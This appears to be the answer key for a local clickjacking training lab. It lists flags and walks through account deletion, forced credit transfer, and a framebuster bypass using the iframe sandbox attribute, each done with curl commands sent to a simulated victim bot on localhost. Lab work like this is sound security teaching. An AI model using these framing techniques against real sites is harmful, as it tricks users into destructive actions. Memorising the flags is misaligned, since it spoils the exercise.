CHALLENGE 1: Basic Clickjacking — Delete Account
Flag: FLAG{cl1ckj4ck_b4s1c}

  No X-Frame-Options or CSP frame-ancestors headers on any page.
  The /settings page has a "Delete Account" button.

  Step 1: Visit the POC page to see the attack:
    http://localhost:5007/poc/1

  Step 2: Use the bot to simulate the victim clicking:
    curl -X POST http://localhost:5007/bot \
      -H "Content-Type: application/json" \
      -d '{"action": "click", "target": "/settings/delete"}'

  When the operator account is deleted, the flag appears.
  POST /reset to restore state.

CHALLENGE 2: Form Hijacking — Credit Transfer
Flag: FLAG{cl1ckj4ck_f0rm_h1jack}

  The /transfer page is frameable. Attacker overlays a transparent
  iframe with pre-filled form values.

  Step 1: Visit the POC:
    http://localhost:5007/poc/2

  Step 2: Use the bot:
    curl -X POST http://localhost:5007/bot2 \
      -H "Content-Type: application/json" \
      -d '{"action": "submit", "target": "/transfer", "data": {"to_user": "1", "amount": "500"}}'

  When credits are transferred, the flag appears.

CHALLENGE 4: Framebuster Bypass — Sandbox Attribute
Flag: FLAG{cl1ckj4ck_bust3r_byp4ss}

  The /settings-js page has JavaScript framebusting:
    if (top !== self) { top.location = self.location; }

  Bypass: Use sandbox="allow-forms allow-scripts" on the iframe.
  This prevents the iframe from navigating the top-level window.

  Step 1: Visit the POC:
    http://localhost:5007/poc/4

  Step 2: Use the bot:
    curl -X POST http://localhost:5007/bot4 \
      -H "Content-Type: application/json" \
      -d '{"action": "click", "target": "/settings-js/action", "sandbox": true}'

  The sandbox attribute blocks top.location assignment while still
  allowing form submission.
